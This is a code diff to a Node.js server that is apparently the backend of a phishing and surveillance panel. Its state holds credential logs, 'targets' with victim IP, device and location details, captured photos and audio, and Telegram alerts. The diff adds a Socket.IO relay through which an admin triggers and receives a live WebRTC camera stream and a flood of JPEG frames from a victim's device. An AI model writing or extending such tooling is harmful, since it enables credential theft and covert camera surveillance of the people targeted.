@@ -18,6 +18,7 @@ const express   = require('express');
 const path      = require('path');
 const http      = require('http');
 const WebSocket = require('ws');
+const { Server: IOServer } = require('socket.io');
 const TelegramBotModule = require('node-telegram-bot-api');
 const TelegramBot = TelegramBotModule.default || TelegramBotModule;
 
@@ -51,16 +52,48 @@ const CHAT_ID   = process.env.CHAT_ID   || 'YOUR_TELEGRAM_CHAT_ID';
 // ─── Initialize Core Services ─────────────────────────────────────────────────
 const app    = express();
 const server = http.createServer(app);
-const wss    = new WebSocket.Server({ server });
+
+// Use noServer: true for ws so we can manually handle upgrades
+const wss    = new WebSocket.Server({ noServer: true });
+
+// ─── Socket.IO Server (Step 7) ────────────────────────────────────────────────
+// Used for WebRTC signaling & high-frequency camera:frame relay
+// Attach Socket.IO to the same server
+const io = new IOServer(server, {
+  cors: { origin: '*', methods: ['GET', 'POST'] },
+  maxHttpBufferSize: 50e6, // 50 MB — handles large base64 frames
+  pingTimeout: 60000,
+  pingInterval: 25000
+});
+
+// Explicitly handle HTTP upgrades to route to either WS or Socket.IO
+server.on('upgrade', (request, socket, head) => {
+  if (request.url.startsWith('/socket.io/')) {
+    // Let Socket.IO handle its own paths
+    // Socket.io automatically intercepts these when attached to the server
+    return;
+  }
+  
+  // Otherwise, handle as raw ws
+  wss.handleUpgrade(request, socket, head, (ws) => {
+    wss.emit('connection', ws, request);
+  });
+});
+
 const bot    = new TelegramBot(BOT_TOKEN, { polling: false });
 
 // ─── In-Memory State ──────────────────────────────────────────────────────────
-const logs           = [];      // credential logs
+const logs             = [];      // credential logs
 const connectedTargets = new Map(); // clientId -> userInfo object
-const activityFeed   = [];      // recent activity events
-const mediaStore     = [];      // captured photos and audio
-let   clientIdCounter = 0;
-let   alertsSent     = 0;
+const activityFeed     = [];      // recent activity events
+const mediaStore       = [];      // captured photos and audio
+let   clientIdCounter  = 0;
+let   alertsSent       = 0;
+
+// ─── Socket.IO State (for WebRTC signaling) ────────────────────────────────────
+// Maps uuid/clientId -> socket.id of connected user Socket.IO clients
+const connectedUsers = new Map(); // uuid -> socketId
+const adminSockets   = new Set(); // Set of Socket.IO socket IDs for admins
 
 // ─── Middleware ───────────────────────────────────────────────────────────────
 app.use(express.json({ limit: '50mb' }));
@@ -554,6 +587,136 @@ wss.on('connection', (ws, req) => {
 
   ws.on('error', (err) => {
     console.error(`[WS Error] Client ${clientId}:`, err.message);
+  });
+});
+
+// ─── Socket.IO Signaling Server (Steps 7 & 8) ────────────────────────────────
+// The Socket.IO server is ONLY a signaling relay — it never processes video.
+io.on('connection', (socket) => {
+  const rawIp = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address;
+  const cleanIp = rawIp === '::1' ? '127.0.0.1' : rawIp;
+
+  // ── Admin joins via Socket.IO ──────────────────────────────────────────────
+  socket.on('join_admin', () => {
+    socket.isAdmin = true;
+    adminSockets.add(socket.id);
+    // Re-emit existing INIT data so admin gets state immediately
+    const targets = Array.from(connectedTargets.values()).map(t => ({
+      clientId:    t.clientId,
+      ip:          t.ip,
+      browser:     t.browser,
+      os:          t.os,
+      device:      t.device,
+      screen:      t.screen,
+      timezone:    t.timezone,
+      location:    t.location,
+      connectedAt: t.connectedAt
+    }));
+    socket.emit('INIT', {
+      logs,
+      totalAttempts: logs.length,
+      targets,
+      media:     mediaStore,
+      activity:  activityFeed,
+      alertsSent
+    });
+    console.log('\x1b[33m[Socket.IO] Admin connected\x1b[0m');
+  });
+
+  // ── Client registers via Socket.IO (with uuid matching WS clientId) ───────
+  socket.on('register', (data) => {
+    if (data && data.uuid) {
+      socket.uuid = data.uuid;
+      connectedUsers.set(data.uuid, socket.id);
+    }
+  });
+
+  // ── Step 8: WebRTC Signaling relay ────────────────────────────────────────
+
+  // Admin requests stream from a user
+  socket.on('webrtc:request', (data) => {
+    const targetId = data.targetId || data.clientId;
+    // Try to find by uuid match first, then by clientId string
+    const userSocketId = connectedUsers.get(String(targetId));
+    if (userSocketId) {
+      io.to(userSocketId).emit('webrtc:request', { adminSocketId: socket.id });
+    }
+    // Also relay via raw WS for the old client
+    broadcastToTarget(targetId, { type: 'START_LIVE_CAMERA' });
+  });
+
+  // Client sends offer → server forwards to admin
+  socket.on('webrtc:offer', (data) => {
+    const adminSocketId = data.adminSocketId;
+    if (adminSocketId) {
+      io.to(adminSocketId).emit('webrtc:offer', {
+        uuid:          socket.uuid || data.uuid,
+        userSocketId:  socket.id,
+        offer:         data.offer
+      });
+    } else {
+      // Broadcast to all admins if no specific admin
+      adminSockets.forEach(sid => {
+        io.to(sid).emit('webrtc:offer', {
+          uuid:         socket.uuid || data.uuid,
+          userSocketId: socket.id,
+          offer:        data.offer
+        });
+      });
+    }
+  });
+
+  // Admin sends answer → server forwards to client
+  socket.on('webrtc:answer', (data) => {
+    const userSocketId = data.userSocketId;
+    if (userSocketId) {
+      io.to(userSocketId).emit('webrtc:answer', { answer: data.answer });
+    }
+  });
+
+  // ICE candidates forwarded in both directions
+  socket.on('webrtc:ice-candidate', (data) => {
+    const target = data.userSocketId || data.adminSocketId;
+    if (target) {
+      io.to(target).emit('webrtc:ice-candidate', { candidate: data.candidate });
+    }
+  });
+
+  // Admin stops the stream
+  socket.on('webrtc:stop', (data) => {
+    const userSocketId = data.userSocketId;
+    if (userSocketId) {
+      io.to(userSocketId).emit('webrtc:stop');
+    }
+    // Also relay via raw WS
+    const targetId = data.targetId || data.clientId;
+    if (targetId) {
+      broadcastToTarget(targetId, { type: 'STOP_LIVE_CAMERA' });
+    }
+  });
+
+  // ── Step 5 / Step 6: camera:frame snapshot relay ─────────────────────────
+  // Client sends high-frequency JPEG frames; server relays to all admins as feed:frame
+  socket.on('camera:frame', (data) => {
+    const uuid = data.uuid || socket.uuid;
+    // Forward to all admin Socket.IO clients
+    adminSockets.forEach(sid => {
+      io.to(sid).emit('feed:frame', {
+        uuid,
+        frame:     data.frame,
+        timestamp: data.timestamp
+      });
+    });
+  });
+
+  // ── Disconnect cleanup ────────────────────────────────────────────────────
+  socket.on('disconnect', () => {
+    if (socket.isAdmin) {
+      adminSockets.delete(socket.id);
+    }
+    if (socket.uuid) {
+      connectedUsers.delete(socket.uuid);
+    }
   });
 });
 
